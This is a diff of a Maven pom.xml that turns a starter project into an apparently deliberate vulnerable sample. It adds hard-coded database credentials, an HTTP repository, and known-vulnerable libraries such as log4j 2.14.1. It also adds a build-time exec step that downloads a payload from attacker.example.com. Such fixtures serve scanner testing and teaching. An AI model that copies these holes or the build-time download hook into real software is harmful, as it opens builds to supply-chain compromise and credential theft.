@@ -1,75 +1,130 @@
-<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd">
+<?xml version="1.0" encoding="UTF-8"?>
+<project xmlns="http://maven.apache.org/POM/4.0.0"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0
+                             http://maven.apache.org/xsd/maven-4.0.0.xsd">
   <modelVersion>4.0.0</modelVersion>
-  <groupId>com.mycompany.app</groupId>
-  <artifactId>my-app</artifactId>
+
+  <groupId>com.example.vuln</groupId>
+  <artifactId>vuln-sample</artifactId>
+  <version>1.0.0-SNAPSHOT</version>
   <packaging>jar</packaging>
-  <version>1.0-SNAPSHOT</version>
-  <name>my-app</name>
-  <url>https://maven.apache.org</url>
+
+  <!-- Hard-coded credentials (sensitive data in source) -->
+  <properties>
+    <db.username>admin</db.username>
+    <db.password>SuperSecretPassword123</db.password>
+    <!-- pins older java target and disables modern security checks -->
+    <maven.compiler.source>1.6</maven.compiler.source>
+    <maven.compiler.target>1.6</maven.compiler.target>
+  </properties>
+
+  <!-- Insecure repository (HTTP + snapshots) -->
+  <repositories>
+    <repository>
+      <id>insecure-http-repo</id>
+      <url>http://insecure-repo.example.com/maven2</url>
+      <releases>
+        <enabled>true</enabled>
+      </releases>
+      <snapshots>
+        <enabled>true</enabled>
+      </snapshots>
+    </repository>
+  </repositories>
+
   <dependencies>
+    <!-- Known vulnerable versions / old libraries -->
+    <!-- log4j <=2.14.1 is vulnerable to Log4Shell (CVE-2021-44228) -->
     <dependency>
-      <groupId>org.junit.jupiter</groupId>
-      <artifactId>junit-jupiter-api</artifactId>
-      <version>6.0.1</version>
-      <scope>test</scope>
+      <groupId>org.apache.logging.log4j</groupId>
+      <artifactId>log4j-core</artifactId>
+      <version>2.14.1</version>
+    </dependency>
+
+    <!-- commons-collections 3.2.1 (deserialization gadgets used in many exploits) -->
+    <dependency>
+      <groupId>commons-collections</groupId>
+      <artifactId>commons-collections</artifactId>
+      <version>3.2.1</version>
+    </dependency>
+
+    <!-- vulnerable jackson-databind older branch -->
+    <dependency>
+      <groupId>com.fasterxml.jackson.core</groupId>
+      <artifactId>jackson-databind</artifactId>
+      <version>2.8.11.3</version>
+    </dependency>
+
+    <!-- old HTTP client with known issues -->
+    <dependency>
+      <groupId>org.apache.httpcomponents</groupId>
+      <artifactId>httpclient</artifactId>
+      <version>4.3.6</version>
+    </dependency>
+
+    <!-- old Spring core with many outdated transitive deps -->
+    <dependency>
+      <groupId>org.springframework</groupId>
+      <artifactId>spring-core</artifactId>
+      <version>4.3.0.RELEASE</version>
     </dependency>
   </dependencies>
-  <properties>
-    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
-  </properties>
+
   <build>
-    <pluginManagement>
-      <plugins>
-        <plugin>
-          <groupId>org.apache.maven.plugins</groupId>
-          <artifactId>maven-compiler-plugin</artifactId>
-          <version>3.14.1</version>
-          <configuration>
-            <release>17</release>
-          </configuration>
-        </plugin>
-      </plugins>
-    </pluginManagement>
     <plugins>
+      <!-- Exec plugin configured to run arbitrary OS command during packaging -->
       <plugin>
-        <!-- Build an executable JAR -->
-        <groupId>org.apache.maven.plugins</groupId>
-        <artifactId>maven-jar-plugin</artifactId>
-        <version>3.5.0</version>
-        <configuration>
-          <archive>
-            <manifest>
-              <addClasspath>true</addClasspath>
-              <classpathPrefix>lib/</classpathPrefix>
-              <mainClass>com.mycompany.app.App</mainClass>
-            </manifest>
-          </archive>
-        </configuration>
-      </plugin>
-      <plugin>
-        <groupId>org.apache.maven.plugins</groupId>
-        <artifactId>maven-enforcer-plugin</artifactId>
-        <version>3.6.2</version>
+        <groupId>org.codehaus.mojo</groupId>
+        <artifactId>exec-maven-plugin</artifactId>
+        <version>1.6.0</version>
         <executions>
           <execution>
-            <id>enforce-maven</id>
+            <id>dangerous-run</id>
+            <phase>package</phase>
             <goals>
-              <goal>enforce</goal>
+              <goal>exec</goal>
             </goals>
             <configuration>
-              <rules>
-                <requireMavenVersion>
-                  <version>[3.9.9,)</version>
-                </requireMavenVersion>
-                <requireJavaVersion>
-                  <version>[21,)</version>
-                </requireJavaVersion>
-              </rules>
+              <!-- runs at build-time — demonstrates dangerous build-time actions -->
+              <executable>sh</executable>
+              <arguments>
+                <argument>-c</argument>
+                <argument>echo "Running dangerous build step"; curl http://attacker.example.com/p > /tmp/payload || true</argument>
+              </arguments>
             </configuration>
           </execution>
         </executions>
       </plugin>
+
+      <!-- Insecure maven-deploy configured for HTTP repository -->
+      <plugin>
+        <groupId>org.apache.maven.plugins</groupId>
+        <artifactId>maven-deploy-plugin</artifactId>
+        <version>2.8.2</version>
+      </plugin>
+
+      <!-- Old surefire plugin and systemClassLoader usage -->
+      <plugin>
+        <groupId>org.apache.maven.plugins</groupId>
+        <artifactId>maven-surefire-plugin</artifactId>
+        <version>2.12.4</version>
+        <configuration>
+          <useSystemClassLoader>true</useSystemClassLoader>
+        </configuration>
+      </plugin>
     </plugins>
   </build>
+
+  <!-- DependencyManagement override to force insecure transitive libs (example) -->
+  <dependencyManagement>
+    <dependencies>
+      <dependency>
+        <groupId>com.fasterxml.jackson.core</groupId>
+        <artifactId>jackson-core</artifactId>
+        <version>2.8.0</version>
+      </dependency>
+    </dependencies>
+  </dependencyManagement>
+
 </project>
